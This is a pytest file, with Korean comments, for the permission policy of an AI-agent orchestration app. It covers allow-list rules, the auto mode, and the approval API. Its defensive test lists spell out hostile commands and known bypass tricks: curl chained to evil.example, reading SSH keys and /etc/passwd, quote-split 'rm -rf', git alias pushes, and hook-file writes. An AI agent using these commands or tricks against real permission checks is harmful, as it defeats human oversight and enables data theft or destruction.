"""auto 권한 모드와 허용 리스트·'항상 허용'(규칙 검증, 정책 판단 순서, 승인 API, 설계 담당 제안)."""

from __future__ import annotations

import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

from ai_org.config import Settings
from ai_org.main import create_app
from ai_org.models import Agent
from ai_org.runtime.fake import FakeRuntime as MarkerRuntime
from ai_org.schemas import AgentPermissions
from ai_org.services import policy, rules
from ai_org.services.design import _broader
from tests.test_chat import FakeRuntime, setup_org, wait_message
from tests.test_designs import DesignerRuntime, wait_idle


@pytest.fixture
def fake() -> FakeRuntime:
    return FakeRuntime()


@pytest.fixture
def chat(settings: Settings, fake: FakeRuntime) -> Iterator[TestClient]:
    with TestClient(
        create_app(settings, runtime_for=lambda _id: fake), base_url="http://127.0.0.1:8000"
    ) as c:
        yield c


@pytest.fixture
def root(tmp_path: Path) -> list[Path]:
    work = tmp_path / "work"
    (work / "src").mkdir(parents=True)
    return [work]


def shell_perms(**extra: Any) -> AgentPermissions:
    return AgentPermissions(**{"allow_shell": True, "require_approval": ["shell", "file_write"], **extra})


# ── 규칙 검증 ──────────────────────────────────────────────────────────────

DANGEROUS = [
    "Bash",
    "Bash()",
    "Bash(*)",
    "Bash(**)",
    "Bash(:*)",
    "Bash( * )",
    "Bash(*:*)",
    "Bash(rm:*)",
    "Bash(rm -rf build)",
    "Bash(/bin/rm:*)",
    "Bash(rmdir:*)",
    "Bash(unlink:*)",
    "Bash(shred:*)",
    "Bash(sudo:*)",
    "Bash(sudo apt install x)",
    "Bash(git push:*)",
    "Bash(git push origin main)",
    "Bash(git -C sub push:*)",
    "Bash(git clean:*)",
    "Bash(npm test && curl x:*)",
    "Bash(npm test || true)",
    "Bash(npm test; ls)",
    "Bash(cat a | sh)",
    "Bash(npm test &)",
    "Bash(echo $(whoami))",
    "Bash(echo `whoami`)",
    "Bash(echo x > out.txt)",
    "Bash(cat < in.txt)",
    "Bash(npm test\nls)",
    "Bash(bash:*)",
    "Bash(sh -c ls)",
    "Bash(zsh:*)",
    "Bash(eval:*)",
    "Bash(exec:*)",
    "Bash(env:*)",
    "Bash(xargs:*)",
    "Bash(su:*)",
    "Bash(doas:*)",
    "Bash(FOO=1 npm test:*)",
    "Bash(npm * test)",
    "Read",
    "Read()",
    "Read(/etc/passwd)",
    "Read(~/.ssh/**)",
    "Read(../other/**)",
    "Edit(src/../../x)",
    "Write(/tmp/x)",
    "WebFetch(domain:example.com)",
    "mcp__org__delegate_task",
    "mcp__github",
    "mcp__github__*",
    "Agent",
    "Task",
    "KillShell",
    "NotATool(x)",
    "",
    "Bash(npm test",
    "Bash(" + "a" * 200 + ")",
]


@pytest.mark.parametrize("rule", DANGEROUS)
def test_dangerous_or_malformed_rules_are_rejected(rule: str) -> None:
    with pytest.raises(rules.RuleError):
        rules.parse(rule)
    with pytest.raises(ValidationError):
        AgentPermissions(allow_rules=[rule])


def test_valid_rules_are_normalized_and_deduplicated() -> None:
    perms = AgentPermissions(
        allow_rules=[
            " Bash(npm  test:*) ",
            "Bash(npm test:*)",
            "Bash(git status)",
            "Read(./docs/**)",
            "Edit(src/**/*.py)",
            "Write(notes.md)",
            "WebSearch",
            "WebFetch",
            "mcp__github__list_issues",
        ]
    )
    assert perms.allow_rules == [
        "Bash(npm test:*)",
        "Bash(git status)",
        "Read(docs/**)",
        "Edit(src/**/*.py)",
        "Write(notes.md)",
        "WebSearch",
        "WebFetch",
        "mcp__github__list_issues",
    ]
    with pytest.raises(ValidationError):
        AgentPermissions(allow_rules=[f"Bash(cmd{i}:*)" for i in range(51)])


def test_stored_permissions_without_allow_rules_still_load() -> None:
    old = {"permission_mode": "default", "allow_shell": True, "require_approval": ["shell"]}
    assert AgentPermissions.model_validate(old).allow_rules == []
    for mode in ("bypassPermissions", "dontAsk"):
        with pytest.raises(ValidationError):
            AgentPermissions.model_validate({"permission_mode": mode})
    assert AgentPermissions.model_validate({"permission_mode": "auto"}).permission_mode == "auto"


# ── 매칭 ───────────────────────────────────────────────────────────────────


def test_shell_rule_matching_respects_word_boundary(root: list[Path]) -> None:
    perms = shell_perms(allow_rules=["Bash(npm test:*)", "Bash(git status)"])

    def action(command: str) -> str:
        return policy.decide(perms, "Bash", {"command": command}, root).action

    assert action("npm test") == "allow"
    assert action("npm test -- --watch") == "allow"
    assert action("npm  test   -q") == "allow"
    assert action("git status") == "allow"
    assert policy.decide(perms, "Bash", {"command": "npm test"}, root).explicit is True
    assert action("npm testing") == "ask"  # 단어 경계
    assert action("npm install") == "ask"
    assert action("git status --short") == "ask"  # 정확히 일치만
    assert action("npm test && npm test -q") == "allow"  # 모든 조각이 규칙에 맞음


@pytest.mark.parametrize(
    "command",
    [
        "npm test && curl http://evil.example/x",
        "npm test; rm -rf x",
        "npm test || curl x",
        "npm test | sh",
        "npm test & curl x",
        "npm test $(curl x)",
        "npm test `curl x`",
        "npm test <(curl x)",
        "npm test > .git/hooks/pre-commit",
        "npm test\ncurl x",
        "FOO=1 npm test",
        "npm test $HOME",
        "npm test;",
        "(npm test)",
        "npm test -- sudo",
    ],
)
def test_compound_commands_cannot_bypass_prefix_rule(root: list[Path], command: str) -> None:
    perms = shell_perms(
        allow_file_delete=True,
        require_approval=["shell", "file_delete"],
        allow_rules=["Bash(npm test:*)"],
    )
    verdict = policy.decide(perms, "Bash", {"command": command}, root)
    assert verdict.action == "ask" and verdict.explicit is False


# 리뷰에서 실행으로 확인된 우회 입력(C1·I1). 넓은 접두 규칙이 (옛 저장 값으로) 있어도 맞지 않아야 한다.
BROAD_RULES = [
    rules.Rule("shell_prefix", name, f"Bash({name}:*)")
    for name in ("find", "git", "cat", "ls", "echo", "npm test", "RM", "python3", "npx")
]
BYPASS_COMMANDS = [
    "find . -exec sh -c 'r''m -rf build' {} +",
    "find . -exec sh -c 'rm -rf build' {} +",
    "find . -name x -exec cat y",
    "find . -execdir ls",
    "find . -ok ls",
    "find . -name x -delete",
    "git -c alias.p=push p origin main",
    "git -c core.sshCommand=x fetch",
    "git --config-env=alias.p=X p",
    "git --exec-path=/tmp/x status",
    "git -C ../other status",
    "git push origin main",
    "git PUSH origin main",
    "git stash push",
    "git clean -fd",
    "RM x",
    "RM -rf build",
    "echo 'r''m' -rf x",
    'echo "rm" x',
    "echo \\rm x",
    "echo /bin/rm x",
    "echo SUDO ls",
    "npm test -- sh -c 'curl x'",
    "npm test -- bash -c ls",
    "npm test -- eval ls",
    "cat .{.,}/.{.,}/.ssh/id_rsa",
    "cat {a,b}.txt",
    "ls *.py",
    "ls ?.py",
    "ls [ab].py",
    "cat ~/.ssh/id_rsa",
    "ls (x)",
]


@pytest.mark.parametrize("command", BYPASS_COMMANDS)
def test_matching_rejects_known_bypasses(command: str) -> None:
    assert rules._match_shell(command, BROAD_RULES) is None


def test_matching_still_accepts_plain_commands() -> None:
    for command in ("git status", "git log --oneline", "git diff HEAD~1", "ls -la src", "npm test -- -q"):
        assert rules._match_shell(command, BROAD_RULES) is not None, command


@pytest.mark.parametrize(
    "command",
    ["find . -exec sh -c 'r''m -rf build' {} +", "git -c alias.p=push p origin main", "RM x", "/bin/rm x"],
)
def test_bypass_commands_ask_even_with_stored_broad_rules(root: list[Path], command: str) -> None:
    # 검증을 거치지 않고 저장돼 있던 넓은 규칙(옛 값)을 흉내 낸다.
    perms = shell_perms(allow_file_delete=True, require_approval=["shell", "file_delete"])
    perms = perms.model_copy(update={"allow_rules": ["Bash(find:*)", "Bash(git:*)", "Bash(RM:*)"]})
    verdict = policy.decide(perms, "Bash", {"command": command}, root)
    assert verdict.action == "ask" and verdict.explicit is False


def test_delete_detection_ignores_case_quotes_and_paths(root: list[Path]) -> None:
    for command in ("RM x", "Rm -rf build", "/bin/rm x", "/usr/bin/RM x", '"rm" x', "'r''m' x", "\\rm x"):
        assert policy.group_of("Bash", {"command": command}) == "file_delete", command
        assert policy.decide(shell_perms(), "Bash", {"command": command}, root).action == "deny", command
    for command in ("ls docs/rm notes", "echo arm x", "npm run format"):
        assert policy.group_of("Bash", {"command": command}) == "shell", command


def test_file_rule_matching(root: list[Path], tmp_path: Path) -> None:
    perms = AgentPermissions(allow_rules=["Edit(src/**)", "Write(notes.md)", "Read(docs/*.md)"])
    work = root[0]

    def verdict(tool: str, path: str) -> policy.Verdict:
        return policy.decide(perms, tool, {"file_path": path}, root)

    assert verdict("Write", "src/a/b.py").explicit is True
    assert verdict("Edit", str(work / "src" / "x.py")).action == "allow"
    assert verdict("MultiEdit", "notes.md").action == "allow"
    assert verdict("Write", "other.md").action == "ask"
    assert verdict("Write", "srcx/a.py").action == "ask"
    # 작업 폴더 밖은 규칙보다 먼저 거부된다(상대 경로 탈출·절대 경로·심볼릭 링크).
    assert verdict("Write", "src/../../etc/x").action == "deny"
    assert verdict("Write", "/etc/hosts").action == "deny"
    outside = tmp_path / "outside"
    outside.mkdir()
    (work / "src" / "link").symlink_to(outside)
    escaped = verdict("Write", "src/link/x.py")
    assert escaped.action == "deny" and escaped.outside is True
    # 읽기 규칙은 쓰기에 적용되지 않는다.
    assert verdict("Write", "docs/a.md").action == "ask"
    assert rules.match(perms.allow_rules, "Read", {"file_path": "docs/a.md"}, root) == "Read(docs/*.md)"
    assert rules.match(perms.allow_rules, "Read", {"file_path": "docs/sub/a.md"}, root) is None


def test_file_rule_does_not_cover_attachment_dirs(root: list[Path], tmp_path: Path) -> None:
    attach = tmp_path / "attach"
    attach.mkdir()
    perms = AgentPermissions(allow_rules=["Edit(**)"])
    verdict = policy.decide(perms, "Write", {"file_path": str(attach / "a.txt")}, [*root, attach])
    assert verdict.action == "ask"  # 폴더 안이라 거부는 아니지만 규칙 대상도 아니다


def test_glob_regex() -> None:
    assert rules.glob_regex("**").fullmatch("")
    assert rules.glob_regex("**").fullmatch("a/b/c.py")
    assert rules.glob_regex("src/**").fullmatch("src")
    assert rules.glob_regex("src/**").fullmatch("src/a/b.py")
    assert not rules.glob_regex("src/**").fullmatch("srcs/a.py")
    assert rules.glob_regex("**/*.py").fullmatch("a.py")
    assert rules.glob_regex("**/*.py").fullmatch("a/b/c.py")
    assert not rules.glob_regex("*.py").fullmatch("a/b.py")
    assert rules.glob_regex("a?.txt").fullmatch("ab.txt")
    assert not rules.glob_regex("a.txt").fullmatch("abtxt")


# ── 판단 순서 ──────────────────────────────────────────────────────────────


def test_outside_paths_win_over_rules_and_auto(root: list[Path]) -> None:
    for mode in ("default", "auto"):
        perms = shell_perms(permission_mode=mode, allow_rules=["Bash(cat:*)", "Read(**)", "Edit(**)"])
        shell = policy.decide(perms, "Bash", {"command": "cat /etc/passwd"}, root)
        assert shell.action == "ask" and shell.outside is True
        assert policy.decide(perms, "Read", {"file_path": "/etc/passwd"}, root).action == "deny"
        assert policy.decide(perms, "Write", {"file_path": "../x"}, root).action == "deny"


def test_disabled_tools_win_over_rules_and_auto(root: list[Path]) -> None:
    for mode in ("default", "auto"):
        perms = AgentPermissions(
            permission_mode=mode,
            allow_shell=False,
            allow_file_write=False,
            allow_network=False,
            allow_rules=["Bash(npm test:*)", "Edit(**)", "WebSearch"],
        )
        for source in ("hook", "runtime"):
            for tool, tool_input in (
                ("Bash", {"command": "npm test"}),
                ("Write", {"file_path": "a.txt"}),
                ("WebSearch", {"query": "x"}),
                ("mcp__org__delegate_task", {"assignee": "x"}),
            ):
                verdict = policy.decide(perms, tool, tool_input, root, source=source)  # type: ignore[arg-type]
                assert verdict.action == "deny", (mode, source, tool)


def test_auto_mode_skips_group_approval_but_asks_on_runtime_prompt(root: list[Path]) -> None:
    perms = shell_perms(permission_mode="auto", allow_rules=["Bash(npm test:*)"])
    hook = policy.decide(perms, "Bash", {"command": "make build"}, root)
    assert hook.action == "allow" and hook.explicit is False  # 묶음별 승인 미적용, 단순 통과
    asked = policy.decide(perms, "Bash", {"command": "make build"}, root, source="runtime")
    assert asked.action == "ask"
    read = policy.decide(perms, "Read", {"file_path": "a.txt"}, root, source="runtime")
    assert read.action == "ask" and read.group is None
    matched = policy.decide(perms, "Bash", {"command": "npm test"}, root, source="runtime")
    assert matched.action == "allow" and matched.explicit is True
    # default에서는 출처가 runtime이어도 기존 판정 그대로다.
    default = shell_perms(require_approval=[])
    assert policy.decide(default, "Bash", {"command": "make"}, root, source="runtime").action == "allow"
    assert policy.decide(shell_perms(), "Bash", {"command": "make"}, root, source="runtime").action == "ask"


def test_suggest_rule(root: list[Path]) -> None:
    assert rules.suggest("Bash", {"command": "npm test -- -q"}, root, group="shell") == (
        "Bash(npm test:*)",
        "",
    )
    assert rules.suggest("Write", {"file_path": "src/a.py"}, root, group="file_write")[0] == "Edit(src/a.py)"
    assert rules.suggest("Read", {"file_path": str(root[0] / "a.md")}, root)[0] == "Read(a.md)"
    assert rules.suggest("WebSearch", {"query": "x"}, root, group="network")[0] == "WebSearch"
    assert rules.suggest("mcp__gh__list", {}, root, group="mcp")[0] == "mcp__gh__list"
    for tool, tool_input, kwargs in (
        ("Bash", {"command": "npm test && curl x"}, {"group": "shell"}),
        ("Bash", {"command": "echo $(whoami)"}, {"group": "shell"}),
        ("Bash", {"command": "sudo ls"}, {"group": "shell"}),
        ("Bash", {"command": "bash -c ls"}, {"group": "shell"}),
        ("Bash", {"command": "rm x"}, {"group": "file_delete"}),
        ("Bash", {"command": "cat /etc/passwd"}, {"group": "shell", "outside": True}),
        ("Write", {"file_path": "/etc/x"}, {"group": "file_write"}),
        ("mcp__org__delegate_task", {"assignee": "x"}, {"group": "delegate"}),
        ("KillShell", {}, {"group": "shell"}),
    ):
        rule, reason = rules.suggest(tool, tool_input, root, **kwargs)  # type: ignore[arg-type]
        assert rule is None and reason, (tool, tool_input)


# ── API: 저장 거부 ─────────────────────────────────────────────────────────


def patch_perms(client: TestClient, org: dict[str, Any], agent: dict[str, Any], **perms: Any) -> Any:
    return client.patch(
        f"/api/v1/organizations/{org['id']}/agents/{agent['id']}",
        json={"permissions": {**agent["permissions"], **perms}},
    )


def lead_of(org: dict[str, Any]) -> dict[str, Any]:
    return next(a for a in org["agents"] if a["is_lead"])


@pytest.mark.parametrize("rule", ["Bash", "Bash(*)", "Bash(rm:*)", "Bash(git push:*)", "Bash(sudo:*)"])
def test_api_rejects_dangerous_rules_with_422(chat: TestClient, rule: str) -> None:
    org, _ = setup_org(chat)
    ceo = lead_of(org)
    res = patch_perms(chat, org, ceo, allow_shell=True, allow_rules=[rule])
    assert res.status_code == 422
    detail = res.json()["detail"][0]
    assert detail["loc"][-1] == "allow_rules" and detail["msg"].startswith("Value error, ")
    assert chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"].get("allow_rules", []) == []
    for mode in ("bypassPermissions", "dontAsk"):
        assert patch_perms(chat, org, ceo, permission_mode=mode).status_code == 422


# ── API: 실행·승인 ─────────────────────────────────────────────────────────


def send(client: TestClient, conv: dict[str, Any], content: str = "실행") -> str:
    res = client.post(f"/api/v1/conversations/{conv['id']}/messages", json={"content": content})
    assert res.status_code == 202
    reply_id: str = res.json()["assistant_message_ids"][0]
    return reply_id


def next_step(
    client: TestClient, org: dict[str, Any], conv: dict[str, Any], reply_id: str, seen: set[str]
) -> tuple[str, dict[str, Any]]:
    """다음 승인 요청("approval") 또는 실행 종료("done")까지 기다린다."""
    deadline = time.time() + 5
    while time.time() < deadline:
        pending = client.get("/api/v1/approvals", params={"organization_id": org["id"]}).json()
        fresh = [p for p in pending if p["id"] not in seen]
        if fresh:
            seen.add(fresh[0]["id"])
            return "approval", fresh[0]
        data = client.get(f"/api/v1/conversations/{conv['id']}").json()
        msg = next(m for m in data["messages"] if m["id"] == reply_id)
        if msg["status"] not in ("pending", "streaming"):
            return "done", msg
        time.sleep(0.03)
    raise AssertionError("실행이 끝나지도, 승인을 요청하지도 않았습니다")


def decide(client: TestClient, approval: dict[str, Any], **body: Any) -> Any:
    return client.post(f"/api/v1/approvals/{approval['id']}/decision", json=body)


def test_matching_rule_skips_approval_and_others_still_ask(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    res = patch_perms(chat, org, ceo, allow_shell=True, allow_rules=["Bash(npm test:*)"])
    assert res.status_code == 200 and res.json()["permissions"]["allow_rules"] == ["Bash(npm test:*)"]
    fake.script = [("tool", "Bash", {"command": "npm test -q"}), ("text", "끝")]
    seen: set[str] = set()
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and msg["activity"][0]["status"] == "done"  # 묻지 않고 실행

    fake.script = [("tool", "Bash", {"command": "npm install left-pad"}), ("text", "끝")]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] == "Bash(npm install left-pad)"
    assert decide(chat, approval, allow=False).json() == {"status": "denied"}
    assert wait_message(chat, conv["id"], reply)["activity"][0]["status"] == "failed"


def test_rule_cannot_reach_outside_workdir(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True, allow_rules=["Bash(cat:*)", "Read(**)", "Edit(**)"])
    fake.script = [
        ("tool", "Read", {"file_path": "/etc/passwd"}),
        ("tool", "Write", {"file_path": "../../x.txt"}),
        ("tool", "Bash", {"command": "cat /etc/passwd"}),
    ]
    seen: set[str] = set()
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    # 파일 도구 두 건은 거부(승인 요청 없음), 셸은 규칙이 있어도 승인 요청.
    assert kind == "approval" and approval["detail"]["tool"] == "Bash"
    assert "작업 폴더 밖" in approval["detail"]["reason"]
    assert approval["detail"]["always_rule"] is None and approval["detail"]["always_reason"]
    res = decide(chat, approval, allow=True, always=True).json()
    assert res["status"] == "approved"
    assert res["always"]["rule"] is None and res["always"]["added"] is False and res["always"]["reason"]
    msg = wait_message(chat, conv["id"], reply)
    assert [a["status"] for a in msg["activity"]] == ["failed", "failed", "done"]
    stored = chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"]
    assert stored == ["Bash(cat:*)", "Read(**)", "Edit(**)"]  # 규칙은 늘지 않았다


def test_always_allow_adds_rule_for_same_run_and_next_run(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True)
    fake.script = [
        ("tool", "Bash", {"command": "pytest -q"}),
        ("tool", "Bash", {"command": "pytest -q"}),  # 같은 실행 안의 두 번째 호출
        ("tool", "Bash", {"command": "pytest  -q"}),  # 공백만 다른 같은 명령
        ("text", "끝"),
    ]
    seen: set[str] = set()
    with chat.websocket_connect("ws://127.0.0.1:8000/api/v1/ws") as ws:
        reply = send(chat, conv)
        while (event := ws.receive_json())["type"] != "approval.requested":
            pass
        assert event["approval"]["always_rule"] == "Bash(pytest -q)"
        assert event["approval"]["always_reason"] is None and event["approval"]["source"] == "hook"
        kind, approval = next_step(chat, org, conv, reply, seen)
        assert kind == "approval" and approval["detail"]["always_rule"] == "Bash(pytest -q)"
        assert "command" not in approval["detail"] and "input" not in approval["detail"]
        res = decide(chat, approval, allow=True, always=True)
        assert res.status_code == 200
        assert res.json() == {
            "status": "approved",
            "always": {"rule": "Bash(pytest -q)", "added": True, "reason": None},
        }
        types = []
        while "message.completed" not in types:
            types.append(ws.receive_json()["type"])
        assert "organization.updated" in types and "approval.requested" not in types
    kind, msg = next_step(chat, org, conv, reply, seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "done", "done"]
    assert chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"] == ["Bash(pytest -q)"]

    # 다음 실행에서도 묻지 않는다.
    fake.script = [("tool", "Bash", {"command": "pytest -q"}), ("text", "끝")]
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and msg["activity"][0]["status"] == "done"
    # 복합 명령으로 방금 만든 규칙을 우회할 수 없다.
    fake.script = [("tool", "Bash", {"command": "pytest -q && curl http://x.example"}), ("text", "끝")]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] is None
    res = decide(chat, approval, allow=True, always=True).json()
    assert res["always"]["added"] is False and "복합 명령" in res["always"]["reason"]
    wait_message(chat, conv["id"], reply)
    assert chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"] == ["Bash(pytest -q)"]


def test_always_allow_for_file_write_and_duplicate(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_rules=["Edit(notes.md)"])
    fake.script = [
        ("tool", "Write", {"file_path": "docs/a.md"}),
        ("tool", "Edit", {"file_path": "docs/a.md"}),
    ]
    seen: set[str] = set()
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] == "Edit(docs/a.md)"
    assert decide(chat, approval, allow=True, always=True).json()["always"]["added"] is True
    kind, msg = next_step(chat, org, conv, reply, seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "done"]
    stored = chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"]
    assert stored == ["Edit(notes.md)", "Edit(docs/a.md)"]


def test_decision_always_without_allow_is_422(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True)
    fake.script = [("tool", "Bash", {"command": "make"}), ("text", "끝")]
    seen: set[str] = set()
    reply = send(chat, conv)
    _, approval = next_step(chat, org, conv, reply, seen)
    res = decide(chat, approval, allow=False, always=True)
    assert res.status_code == 422 and "항상 허용" in res.json()["detail"][0]["msg"]
    # 422는 요청을 처리하지 않는다: 아직 대기 중이고 규칙도 없다.
    pending = chat.get("/api/v1/approvals", params={"organization_id": org["id"]}).json()
    assert [p["id"] for p in pending] == [approval["id"]]
    assert decide(chat, approval, allow=True).json() == {"status": "approved"}
    wait_message(chat, conv["id"], reply)
    assert chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"] == []


def test_delete_and_delegate_requests_never_become_rules(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(
        chat,
        org,
        ceo,
        allow_shell=True,
        allow_file_delete=True,
        can_delegate=True,
        require_approval=["shell", "file_delete", "delegate"],
    )
    fake.script = [("tool", "Bash", {"command": "rm -rf build"}), ("tool", "mcp__org__delegate_task", {})]
    seen: set[str] = set()
    reply = send(chat, conv)
    for group in ("file_delete", "delegate"):
        kind, approval = next_step(chat, org, conv, reply, seen)
        assert kind == "approval" and approval["detail"]["group"] == group
        res = decide(chat, approval, allow=True, always=True).json()
        assert res["status"] == "approved" and res["always"]["rule"] is None and res["always"]["reason"]
    wait_message(chat, conv["id"], reply)
    assert chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]["allow_rules"] == []


def test_auto_mode_run(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    res = patch_perms(chat, org, ceo, permission_mode="auto", allow_shell=True)
    assert res.status_code == 200
    seen: set[str] = set()
    # 묶음별 승인(shell·file_write)이 켜져 있어도 auto에서는 묻지 않는다.
    fake.script = [("tool", "Bash", {"command": "make"}), ("tool", "Write", {"file_path": "a.txt"})]
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "done"]
    assert fake.requests[-1].permission_mode == "auto"

    # Claude Code가 되물으면 승인 배너를 만든다.
    fake.script = [("ask", "Bash", {"command": "make deploy"}), ("ask", "Read", {"file_path": "a.txt"})]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["source"] == "runtime"
    assert (
        approval["detail"]["group"] == "shell" and approval["detail"]["always_rule"] == "Bash(make deploy:*)"
    )
    assert decide(chat, approval, allow=True).status_code == 200
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["group"] is None  # 묶음이 없는 도구
    assert approval["detail"]["always_rule"] == "Read(a.txt)"
    assert decide(chat, approval, allow=False).status_code == 200
    kind, msg = next_step(chat, org, conv, reply, seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "failed"]

    # 되묻기에도 폴더 밖 판정이 다시 적용된다(파일 도구는 거부).
    fake.script = [("ask", "Read", {"file_path": "/etc/passwd"})]
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and msg["activity"][0]["status"] == "failed"


def test_auto_and_rules_cannot_enable_disabled_shell(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    res = patch_perms(
        chat, org, ceo, permission_mode="auto", allow_shell=False, allow_rules=["Bash(npm test:*)"]
    )
    assert res.status_code == 200
    fake.script = [("tool", "Bash", {"command": "npm test"}), ("ask", "Bash", {"command": "npm test"})]
    seen: set[str] = set()
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["failed", "failed"]
    assert "Bash" in fake.requests[-1].disallowed_tools


def test_default_mode_keeps_existing_runtime_behaviour(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True, require_approval=[])
    fake.script = [("ask", "Bash", {"command": "make"}), ("text", "끝")]
    kind, msg = next_step(chat, org, conv, send(chat, conv), set())
    assert kind == "done" and msg["activity"][0]["status"] == "done"  # 정책이 통과시킨 호출은 묻지 않는다


def test_legacy_stored_permissions_run(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    with chat.app.state.runs.factory() as db:  # type: ignore[attr-defined]
        agent = db.get(Agent, ceo["id"])
        agent.permissions = {"allow_shell": True, "require_approval": ["shell"], "can_delegate": True}
        db.commit()
    assert chat.get(f"/api/v1/agents/{ceo['id']}").status_code == 200
    fake.script = [("tool", "Bash", {"command": "ls"}), ("text", "끝")]
    seen: set[str] = set()
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] == "Bash(ls)"
    assert decide(chat, approval, allow=True, always=True).json()["always"]["added"] is True
    assert wait_message(chat, conv["id"], reply)["status"] == "done"
    perms = chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]
    assert perms["allow_rules"] == ["Bash(ls)"] and perms["can_delegate"] is True


# ── 가짜 런타임 표식 ───────────────────────────────────────────────────────


def test_marker_runtime_shell_and_reask(settings: Settings) -> None:
    runtime = MarkerRuntime()
    with TestClient(
        create_app(settings, runtime_for=lambda _id: runtime), base_url="http://127.0.0.1:8000"
    ) as client:
        org, conv = setup_org(client)
        ceo = lead_of(org)
        patch_perms(client, org, ceo, allow_shell=True)
        seen: set[str] = set()
        reply = send(client, conv, "[셸:npm test] 그리고 [셸:npm test -q]")
        kind, approval = next_step(client, org, conv, reply, seen)
        assert kind == "approval" and approval["detail"]["target"] == "npm test"
        assert (
            decide(client, approval, allow=True, always=True).json()["always"]["rule"] == "Bash(npm test:*)"
        )
        kind, msg = next_step(client, org, conv, reply, seen)  # 두 번째 명령은 묻지 않는다
        assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "done"]
        assert "허용되었습니다" in msg["content"]

        # default 모드의 되묻기 표식은 기존 동작(정책 판정 한 번)이다.
        kind, msg = next_step(client, org, conv, send(client, conv, "[되묻기:npm test --watch]"), seen)
        assert kind == "done"
        # auto 모드: 규칙에 없는 명령을 런타임이 되물으면 승인 배너가 뜬다.
        ceo = client.get(f"/api/v1/agents/{ceo['id']}").json()
        patch_perms(client, org, ceo, permission_mode="auto")
        reply = send(client, conv, "[되묻기:make deploy]")
        kind, approval = next_step(client, org, conv, reply, seen)
        assert kind == "approval" and approval["detail"]["source"] == "runtime"
        assert decide(client, approval, allow=False).status_code == 200
        assert "거부되었습니다" in wait_message(client, conv["id"], reply)["content"]
        kind, _ = next_step(client, org, conv, send(client, conv, "[셸:make deploy]"), seen)
        assert kind == "done"  # auto에서 훅만 거치는 호출은 묻지 않는다


# ── 설계 담당 AI의 권한 확대 제안 ──────────────────────────────────────────


def test_broader_detects_mode_and_rule_expansion() -> None:
    base = AgentPermissions()
    assert _broader(AgentPermissions(permission_mode="auto"), base)
    assert _broader(AgentPermissions(permission_mode="acceptEdits"), base)
    assert _broader(base, AgentPermissions(permission_mode="plan"))
    assert not _broader(AgentPermissions(permission_mode="plan"), base)
    assert not _broader(base, AgentPermissions(permission_mode="auto"))
    assert _broader(AgentPermissions(allow_rules=["WebSearch"]), base)
    with_rules = AgentPermissions(allow_rules=["WebSearch", "Read(docs/**)"])
    assert not _broader(AgentPermissions(allow_rules=["WebSearch"]), with_rules)
    assert _broader(AgentPermissions(allow_rules=["WebSearch", "Edit(src/**)"]), with_rules)


def test_ai_proposed_auto_mode_and_rules_stay_as_suggestions(settings: Settings) -> None:
    designer = DesignerRuntime()
    with TestClient(
        create_app(settings, runtime_for=lambda _id: designer), base_url="http://127.0.0.1:8000"
    ) as api:
        d = api.post("/api/v1/designs", json={}).json()
        spec = d["spec"]
        spec["departments"] = [{"key": "dev", "name": "개발팀"}]
        base = {"department": "dev", "reports_to": "ceo"}
        spec["agents"] += [
            {**base, "key": "auto_dev", "name": "자동 개발자", "permissions": {"permission_mode": "auto"}},
            {
                **base,
                "key": "rule_dev",
                "name": "규칙 개발자",
